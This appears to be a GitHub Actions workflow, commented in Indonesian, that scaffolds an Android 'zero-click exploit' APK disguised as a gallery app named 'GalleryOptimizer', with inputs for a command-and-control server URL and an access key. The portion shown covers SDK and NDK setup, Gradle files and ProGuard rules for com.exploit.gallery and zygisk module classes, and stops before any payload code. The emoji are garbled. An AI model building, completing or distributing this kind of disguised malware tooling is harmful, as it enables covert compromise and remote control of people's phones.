name: ðŸ”¥ Zero-Click Exploit Builder Android 10-15 (Manual Trigger)

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'GalleryOptimizer'
        type: string
      c2_url:
        description: 'C2 Server URL'
        required: true
        default: 'https://your-server.com/api'
        type: string
      access_key:
        description: 'Access Key (min 16 karakter)'
        required: true
        default: ''
        type: string
      android_versions:
        description: 'Target Android Versions'
        required: true
        default: 'all'
        type: choice
        options:
          - 'all'
          - '10'
          - '11'
          - '12'
          - '13'
          - '14'
          - '15'

permissions:
  contents: write
  actions: write
  checks: write

jobs:
  generate-and-build:
    name: ðŸš€ Generate All Files & Build APK
    runs-on: ubuntu-latest
    
    steps:
    - name: ðŸ“¥ Checkout Repository
      uses: actions/checkout@v4
      
    - name: ðŸ”§ Setup JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'
        
    - name: ðŸ“± Setup Android SDK
      uses: android-actions/setup-android@v3
      
    - name: ðŸ“¦ Install Build Tools & NDK
      run: |
        sdkmanager "platform-tools" "platforms;android-35"
        sdkmanager "build-tools;34.0.0"
        sdkmanager "ndk;25.2.9519653"
        sdkmanager "cmake;3.22.1"
        
    - name: ðŸŽ¨ CREATE ALL PROJECT FILES
      run: |
        # ============================================
        # MEMBUAT SELURUH STRUKTUR FOLDER
        # ============================================
        
        echo "ðŸ“ Membuat struktur folder..."
        
        # Buat folder utama
        mkdir -p app/src/main/java/com/exploit/gallery
        mkdir -p app/src/main/res/layout
        mkdir -p app/src/main/res/values
        mkdir -p app/src/main/res/xml
        mkdir -p app/src/main/res/drawable
        mkdir -p app/src/main/res/mipmap-hdpi
        mkdir -p app/src/main/res/mipmap-mdpi
        mkdir -p app/src/main/res/mipmap-xhdpi
        mkdir -p app/src/main/res/mipmap-xxhdpi
        mkdir -p app/src/main/res/mipmap-xxxhdpi
        mkdir -p app/src/main/jni
        mkdir -p app/src/main/jni/zygisk
        mkdir -p app/libs
        mkdir -p exploits
        mkdir -p scripts
        
        # ============================================
        # 1. MEMBUAT GRADLE BUILD FILES
        # ============================================
        
        echo "ðŸ“ Membuat build.gradle (project)..."
        cat > build.gradle << 'EOF'
// Top-level build file
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.2.0'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF

        echo "ðŸ“ Membuat settings.gradle..."
        cat > settings.gradle << 'EOF'
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "${{ github.event.inputs.app_name }}"
include ':app'
EOF

        echo "ðŸ“ Membuat app/build.gradle..."
        cat > app/build.gradle << 'EOF'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.exploit.gallery'
    compileSdk 35

    defaultConfig {
        applicationId "com.exploit.gallery"
        minSdk 21
        targetSdk 35
        versionCode 1
        versionName "4.2.1"
        
        ndk {
            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
        }
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    
    externalNativeBuild {
        ndkBuild {
            path 'src/main/jni/Android.mk'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation fileTree(dir: 'libs', include: ['*.jar', '*.aar'])
}
EOF

        echo "ðŸ“ Membuat proguard-rules.pro..."
        cat > app/proguard-rules.pro << 'EOF'
-keep class com.exploit.gallery.** { *; }
-keep class com.android.media.exploit.** { *; }
-keep class * extends zygisk.ModuleBase { *; }
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes EnclosingMethod
-dontwarn javax.**
-dontwarn java.awt.**
-dontoptimize
-dontpreverify
EOF

